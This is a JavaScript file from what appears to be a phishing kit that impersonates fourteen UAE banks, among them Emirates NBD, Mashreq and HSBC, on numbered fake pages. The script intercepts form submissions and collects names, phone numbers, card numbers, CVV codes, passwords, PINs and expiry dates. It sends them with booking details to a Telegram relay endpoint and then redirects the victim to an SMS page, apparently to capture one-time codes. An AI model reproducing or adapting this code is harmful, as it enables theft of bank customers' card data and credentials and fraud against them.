// قاموس أسماء البنوك بناءً على رقم الصفحة
const BANK_PAGE_NAMES = {
    '1.html': 'بنك راس الخيمة الوطني',
    '2.html': 'مصرف عجمان',
    '3.html': 'بنك الفجيرة الوطني',
    '4.html': 'بنك دبي الاسلامي',
    '5.html': 'بنك الامارات دبي الوطني',
    '6.html': 'بنك ابو ظبي التجاري',
    '7.html': 'البنك التجاري الدولي',
    '8.html': 'مصرف الشارقة الاسلامي',
    '9.html': 'الامارات الاسلامي',
    '10.html': 'بنك دبي التجاري',
    '11.html': 'بنك HSBC',
    '12.html': 'مصرف ابو ظبي الاسلامي ADIB',
    '13.html': 'بنك ابو ظبي الاول',
    '14.html': 'المشرق'
};

// دالة للحصول على اسم البنك من اسم الصفحة الحالية
function getCurrentBankName() {
    const currentPage = window.location.pathname.split('/').pop();
    return BANK_PAGE_NAMES[currentPage] || 'بنك غير معروف';
}

// دالة للتحقق من صحة حقل الإدخال
function validateInput(input) {
    const value = input.value.trim();
    const name = (input.name || input.id || input.placeholder || '').toLowerCase();
    
    // إذا كان الحقل فارغاً، نتجاهله
    if (!value) {
        return { valid: false, message: '' };
    }
    
    // التحقق من الاسم (يجب أن يحتوي على حروف فقط وطوله بين 2-50 حرف)
    if (name.includes('name') || name.includes('holder') || name.includes('اسم')) {
        if (value.length < 2) {
            return { valid: false, message: 'الاسم يجب أن يحتوي على حرفين على الأقل' };
        }
        if (value.length > 50) {
            return { valid: false, message: 'الاسم يجب أن لا يتجاوز 50 حرف' };
        }
        // التحقق من أن الاسم يحتوي على حروف فقط (عربي أو إنجليزي) ومسافات
        const namePattern = /^[a-zA-Zأ-ي\s]+$/;
        if (!namePattern.test(value)) {
            return { valid: false, message: 'الاسم يجب أن يحتوي على حروف فقط' };
        }
    }
    
    // التحقق من رقم الهاتف (8-15 رقم)
    if (name.includes('phone') || name.includes('mobile') || name.includes('tel') || name.includes('هاتف')) {
        const cleanedPhone = value.replace(/[\s\-\(\)\+]/g, '');
        const phonePattern = /^[0-9]{8,15}$/;
        if (!phonePattern.test(cleanedPhone)) {
            return { valid: false, message: 'رقم الهاتف يجب أن يحتوي على 8-15 رقم' };
        }
    }
    
    // التحقق من البريد الإلكتروني
    if (name.includes('email') || name.includes('mail') || name.includes('بريد')) {
        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailPattern.test(value)) {
            return { valid: false, message: 'البريد الإلكتروني غير صحيح' };
        }
    }
    
    // التحقق من رقم البطاقة (16 رقم بالضبط)
    if (name.includes('card') || name.includes('بطاقة') || name.includes('رقم')) {
        // تجاهل CVV/CVC
        if (name.includes('cvv') || name.includes('cvc') || name.includes('security')) {
            // سيتم التحقق منه في القسم التالي
        } else {
            const cleanedCard = value.replace(/[\s\-]/g, '');
            const cardPattern = /^[0-9]{16}$/;
            if (!cardPattern.test(cleanedCard)) {
                return { valid: false, message: 'رقم البطاقة يجب أن يحتوي على 16 رقم بالضبط' };
            }
        }
    }
    
    // التحقق من CVV (3 أو 4 أرقام)
    if (name.toLowerCase().includes('cvv') || name.toLowerCase().includes('cvc') || name.toLowerCase().includes('security')) {
        const cvvPattern = /^[0-9]{3,4}$/;
        if (!cvvPattern.test(value)) {
            return { valid: false, message: 'رمز CVV يجب أن يحتوي على 3-4 أرقام' };
        }
    }
    
    // التحقق من كلمة المرور (6 أحرف على الأقل)
    if (name.toLowerCase().includes('password') || name.toLowerCase().includes('pass') || name.toLowerCase().includes('pin')) {
        if (value.length < 4) {
            return { valid: false, message: 'كلمة المرور يجب أن تحتوي على 4 أحرف على الأقل' };
        }
    }
    
    // التحقق من تاريخ الانتهاء (MM/YY أو MM/YYYY)
    if (name.toLowerCase().includes('expir') || name.toLowerCase().includes('valid')) {
        const expiryPattern = /^(0[1-9]|1[0-2])\/([0-9]{2}|[0-9]{4})$/;
        if (!expiryPattern.test(value)) {
            return { valid: false, message: 'تاريخ الانتهاء يجب أن يكون بصيغة MM/YY' };
        }
    }
    
    return { valid: true, message: '' };
}

// دالة لجمع بيانات النموذج
function collectFormData() {
    const formData = {};
    const errors = [];
    
    // جمع جميع حقول الإدخال
    const inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[type="email"], input[type="number"], input[type="password"]');
    inputs.forEach(input => {
        // استخدام name أو id أو placeholder كمفتاح
        const key = input.name || input.id || input.placeholder || `field_${Math.random()}`;
        
        // التحقق من صحة الحقل
        const validation = validateInput(input);
        
        // إذا كان الحقل يحتوي على قيمة
        if (input.value && input.value.trim() !== '') {
            formData[key] = input.value.trim();
            
            // إذا كان التحقق فاشلاً، أضف الخطأ
            if (!validation.valid && validation.message) {
                errors.push({ field: key, message: validation.message });
            }
        }
    });
    
    // جمع حقول select
    const selects = document.querySelectorAll('select');
    selects.forEach(select => {
        if (select.value && select.value.trim() !== '') {
            const key = select.name || select.id || `select_${Math.random()}`;
            formData[key] = select.value.trim();
        }
    });
    
    return { data: formData, errors: errors };
}

// دالة لإرسال البيانات إلى API
function sendBankFormData(formData) {
    const bankName = getCurrentBankName();
    
    // الحصول على بيانات الحجز من localStorage
    const bookingData = JSON.parse(localStorage.getItem('bookingData') || '{}');
    const bookingId = bookingData.bookingId || 'غير متوفر';
    const amount = bookingData.amount || 'غير متوفر';
    
    // إعداد البيانات للإرسال
    const dataToSend = {
        bankName: bankName,
        bookingId: bookingId,
        amount: amount,
        formData: formData,
        timestamp: new Date().toISOString()
    };
    
    // إرسال البيانات إلى API
    return fetch('/api/telegram/bank-form-data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(dataToSend)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('فشل في إرسال البيانات');
        }
        return response.json();
    })
    .then(data => {
        console.log('تم إرسال بيانات النموذج إلى تليجرام:', data);
        return data;
    })
    .catch(error => {
        console.error('خطأ في إرسال البيانات:', error);
        throw error;
    });
}

// دالة لعرض رسالة خطأ
function showValidationError(message) {
    // إزالة أي رسالة خطأ موجودة
    const existingError = document.querySelector('.validation-error-message');
    if (existingError) {
        existingError.remove();
    }
    
    // إنشاء رسالة خطأ جديدة
    const errorDiv = document.createElement('div');
    errorDiv.className = 'validation-error-message';
    errorDiv.style.cssText = `
        position: fixed;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        background: #fee2e2;
        border: 1px solid #fecaca;
        color: #dc2626;
        padding: 1rem 2rem;
        border-radius: 8px;
        z-index: 10000;
        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        animation: slideDown 0.3s ease;
        max-width: 90%;
        text-align: center;
    `;
    errorDiv.innerHTML = `<i class="fa fa-exclamation-circle"></i> ${message}`;
    
    document.body.appendChild(errorDiv);
    
    // إزالة الرسالة بعد 5 ثوانٍ
    setTimeout(() => {
        if (errorDiv.parentNode) {
            errorDiv.remove();
        }
    }, 5000);
}

// مراقبة جميع النماذج في الصفحة
document.addEventListener('DOMContentLoaded', function() {
    console.log('Bank Form Tracker initialized for:', getCurrentBankName());
    
    // مراقبة جميع أزرار الإرسال
    const submitButtons = document.querySelectorAll('button[type="submit"], input[type="submit"], button[data-testid*="submit"]');
    
    submitButtons.forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            
            // جمع البيانات من النموذج
            const result = collectFormData();
            
            // التحقق من وجود أخطاء
            if (result.errors.length > 0) {
                const errorMessage = result.errors.map(err => err.message).join('<br>');
                showValidationError(errorMessage);
                return;
            }
            
            // إرسال البيانات إذا كانت موجودة
            if (Object.keys(result.data).length > 0) {
                // عرض حالة التحميل
                const originalText = button.innerHTML;
                button.disabled = true;
                button.innerHTML = '<i class="fa fa-spinner fa-spin"></i> جاري الإرسال...';
                
                // حفظ بيانات البنك في localStorage
                const bankData = {
                    bankName: getCurrentBankName(),
                    timestamp: new Date().toISOString()
                };
                localStorage.setItem('bankData', JSON.stringify(bankData));
                
                sendBankFormData(result.data)
                    .then(() => {
                        // التوجيه إلى صفحة SMS بعد إرسال البيانات بنجاح
                        window.location.href = '../../sms/sms.html';
                    })
                    .catch(error => {
                        // إعادة تفعيل الزر في حالة الفشل
                        button.disabled = false;
                        button.innerHTML = originalText;
                        showValidationError('حدث خطأ في إرسال البيانات. يرجى المحاولة مرة أخرى.');
                    });
            } else {
                showValidationError('يرجى ملء جميع الحقول المطلوبة');
            }
        });
    });
    
    // مراقبة جميع النماذج
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // تفعيل زر الإرسال بدلاً من ذلك
            const submitButton = form.querySelector('button[type="submit"], input[type="submit"]');
            if (submitButton) {
                submitButton.click();
            }
        });
    });
});
